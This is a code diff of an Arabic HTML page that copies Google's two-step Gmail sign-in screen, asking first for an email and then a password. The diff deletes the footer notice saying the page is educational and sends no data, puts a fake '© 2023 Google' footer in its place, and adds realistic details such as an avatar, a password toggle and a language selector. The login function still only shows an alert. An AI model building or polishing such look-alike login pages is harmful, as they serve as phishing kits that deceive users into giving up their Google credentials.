@@ -1,116 +1,300 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>تسجيل الدخول - حساب Google</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-      margin: 0;
-      padding: 0;
+      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+      background-color: #f1f1f1;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
+      align-items: center;
       height: 100vh;
+      margin: 0;
+      color: #202124;
     }
-    .content {
-      max-width: 450px;
-      width: 100%;
-      padding: 40px;
-      margin-top: 60px;
+    .container {
+      background-color: white;
+      width: 450px;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      box-sizing: border-box;
     }
     .logo {
       display: block;
-      margin: 0 auto 30px auto;
-      width: 92px;
+      margin: 0 auto 16px auto;
+      width: 75px;
+      height: 24px;
     }
     h1 {
       font-size: 24px;
       font-weight: 400;
+      text-align: center;
       margin-bottom: 8px;
     }
-    p {
-      font-size: 14px;
+    .subtitle {
+      font-size: 16px;
       color: #5f6368;
-      margin: 0 0 25px;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .input-container {
+      margin-bottom: 24px;
     }
     input {
       width: 100%;
-      padding: 14px;
-      margin: 8px 0;
+      padding: 13px 15px;
+      margin: 1px 0;
       border: 1px solid #dadce0;
       border-radius: 4px;
-      font-size: 14px;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: border 0.2s;
     }
-    button {
+    input:focus {
+      border: 2px solid #1a73e8;
+      outline: none;
+      margin: 0 -1px;
+    }
+    input.error {
+      border-color: #d93025;
+    }
+    .error-message {
+      color: #d93025;
+      font-size: 14px;
+      margin: 4px 0 0;
+      display: none;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+    .create-account {
+      color: #1a73e8;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+    .next-button {
       background-color: #1a73e8;
       color: white;
       border: none;
       padding: 10px 24px;
       font-size: 14px;
+      font-weight: 500;
       border-radius: 4px;
       cursor: pointer;
-      float: right;
+      transition: background-color 0.2s;
     }
-    button:hover {
-      background-color: #1669c1;
+    .next-button:hover {
+      background-color: #1765d1;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .next-button:disabled {
+      background-color: #8ab4f8;
+      cursor: default;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      text-align: center;
+      color: #5f6368;
+      line-height: 1.5;
+    }
+    .language-selector {
+      position: absolute;
+      bottom: 20px;
+      left: 20px;
+      font-size: 12px;
+      color: #5f6368;
     }
     .hidden {
       display: none;
     }
-    .footer {
-      margin-top: 50px;
-      font-size: 12px;
-      text-align: center;
+    .forgot-email {
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 8px;
+      display: inline-block;
+    }
+    .user-info {
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+      padding: 8px;
+      border-radius: 16px;
+      background-color: #f1f1f1;
+    }
+    .user-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #1a73e8;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 500;
+      margin-left: 8px;
+    }
+    .user-email {
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .more-options {
       color: #5f6368;
+      font-size: 14px;
+      margin-top: 16px;
+      cursor: pointer;
+    }
+    .password-toggle {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #5f6368;
+      font-size: 14px;
+    }
+    .password-container {
+      position: relative;
     }
   </style>
 </head>
 <body>
-  <div class="content">
+  <div class="container">
     <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
+    <h1>تسجيل الدخول</h1>
+    <p class="subtitle">متابعة إلى Gmail</p>
 
-    <!-- الخطوة الأولى -->
+    <!-- الخطوة الأولى: البريد -->
     <div id="step-email">
-      <h1>تسجيل الدخول</h1>
-      <p>متابعة إلى Gmail</p>
-      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-      <button onclick="goToPassword()">التالي</button>
+      <div class="input-container">
+        <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <p id="email-error" class="error-message">الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح</p>
+      </div>
+      <div class="buttons">
+        <a href="#" class="create-account">إنشاء حساب</a>
+        <button id="next-button" class="next-button" onclick="goToPassword()">التالي</button>
+      </div>
+      <a href="#" class="forgot-email">نسيت البريد الإلكتروني؟</a>
     </div>
 
-    <!-- الخطوة الثانية -->
+    <!-- الخطوة الثانية: كلمة المرور -->
     <div id="step-password" class="hidden">
-      <h1>مرحبًا بك</h1>
-      <p id="show-email"></p>
-      <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-      <button onclick="login()">تسجيل الدخول</button>
+      <div class="user-info">
+        <div class="user-avatar" id="user-avatar">م</div>
+        <div class="user-email" id="user-email-display">user@example.com</div>
+      </div>
+      <div class="input-container">
+        <div class="password-container">
+          <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+          <span class="password-toggle" onclick="togglePassword()">إظهار</span>
+        </div>
+        <p id="password-error" class="error-message">الرجاء إدخال كلمة المرور</p>
+      </div>
+      <a href="#" class="forgot-email">نسيت كلمة المرور؟</a>
+      <div class="more-options">خيارات أخرى لتسجيل الدخول</div>
+      <div class="buttons">
+        <a href="#" class="create-account" onclick="goBackToEmail()">استخدام بريد إلكتروني آخر</a>
+        <button id="login-button" class="next-button" onclick="login()">تسجيل الدخول</button>
+      </div>
     </div>
 
-    <div class="footer">هذا نموذج تعليمي فقط ولا يرسل البيانات</div>
+    <div class="footer">
+      <p>© 2023 Google</p>
+      <p>شروط الخدمة - الخصوصية - مساعدة</p>
+    </div>
   </div>
+
+  <div class="language-selector">العربية (مصر)</div>
 
   <script>
     function goToPassword() {
       const email = document.getElementById('email').value.trim();
-      if(email === "") {
-        alert("الرجاء إدخال البريد الإلكتروني");
+      const emailError = document.getElementById('email-error');
+      
+      if(email === "" || !validateEmail(email)) {
+        document.getElementById('email').classList.add('error');
+        emailError.style.display = 'block';
         return;
       }
+      
       document.getElementById('step-email').classList.add('hidden');
       document.getElementById('step-password').classList.remove('hidden');
-      document.getElementById('show-email').textContent = email;
+      document.getElementById('user-email-display').textContent = email;
+      document.getElementById('user-avatar').textContent = email.charAt(0).toUpperCase();
     }
-
+    
+    function goBackToEmail() {
+      document.getElementById('step-password').classList.add('hidden');
+      document.getElementById('step-email').classList.remove('hidden');
+      document.getElementById('email').focus();
+    }
+    
     function login() {
       const password = document.getElementById('password').value.trim();
+      const passwordError = document.getElementById('password-error');
+      
       if(password === "") {
-        alert("الرجاء إدخال كلمة المرور");
+        document.getElementById('password').classList.add('error');
+        passwordError.style.display = 'block';
         return;
       }
-      alert("تم تسجيل الدخول (محاكاة فقط)");
+      
+      // إرسال البيانات إلى الخادم (محاكاة فقط)
+      alert("جارٍ التحقق من بياناتك...");
     }
+    
+    function togglePassword() {
+      const passwordField = document.getElementById('password');
+      const toggleButton = document.querySelector('.password-toggle');
+      
+      if(passwordField.type === 'password') {
+        passwordField.type = 'text';
+        toggleButton.textContent = 'إخفاء';
+      } else {
+        passwordField.type = 'password';
+        toggleButton.textContent = 'إظهار';
+      }
+    }
+    
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+    
+    // تحسين تجربة المستخدم
+    document.getElementById('email').addEventListener('input', function() {
+      this.classList.remove('error');
+      document.getElementById('email-error').style.display = 'none';
+    });
+    
+    document.getElementById('password').addEventListener('input', function() {
+      this.classList.remove('error');
+      document.getElementById('password-error').style.display = 'none';
+    });
+    
+    document.getElementById('email').addEventListener('keypress', function(e) {
+      if(e.key === 'Enter') {
+        goToPassword();
+      }
+    });
+    
+    document.getElementById('password').addEventListener('keypress', function(e) {
+      if(e.key === 'Enter') {
+        login();
+      }
+    });
   </script>
 </body>
 </html>
-
